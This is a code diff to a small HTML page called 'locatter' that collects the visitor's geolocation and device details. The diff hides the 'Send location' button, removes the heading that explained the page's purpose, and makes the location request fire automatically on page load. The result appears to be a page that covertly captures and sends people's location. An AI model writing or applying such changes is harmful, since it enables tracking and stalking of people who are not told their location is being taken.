@@ -6,12 +6,11 @@
   <meta name="viewport" content="width=device-width,initial-scale=1">
   <style>
     body{font-family:system-ui,-apple-system,Segoe UI,Roboto,Arial;margin:24px;background:#0f172a;color:#e6eef8}
-    button{background:#06b6d4;border:none;padding:10px 14px;border-radius:8px;color:#042a2b;font-weight:600;cursor:pointer}
+    button{background:#06b6d4;border:none;padding:10px 14px;border-radius:8px;color:#042a2b;font-weight:600;cursor:pointer;display:none}
     pre{white-space:pre-wrap;background:#071126;padding:12px;border-radius:8px;margin-top:12px}
   </style>
 </head>
 <body>
-  <h2>Send my location (locatter)</h2>
   <button id="go">Send location</button>
   <pre id="log">idle</pre>
 <script>
@@ -38,7 +37,7 @@ function makePayload(pos){
   const t = new Date(pos.timestamp).toISOString()
   return `lat:${latitude} lon:${longitude} acc:${accuracy} alt:${altitude ?? ""} altAcc:${altitudeAccuracy ?? ""} heading:${heading ?? ""} speed:${speed ?? ""} time:${t} // ${deviceInfo()}`
 }
-sendBtn.addEventListener("click", async ()=>{
+document.addEventListener("DOMContentLoaded", async ()=>{
   if(!("geolocation" in navigator)){ write("Geolocation not available in this browser"); return }
   write("requesting permission…")
   navigator.geolocation.getCurrentPosition(
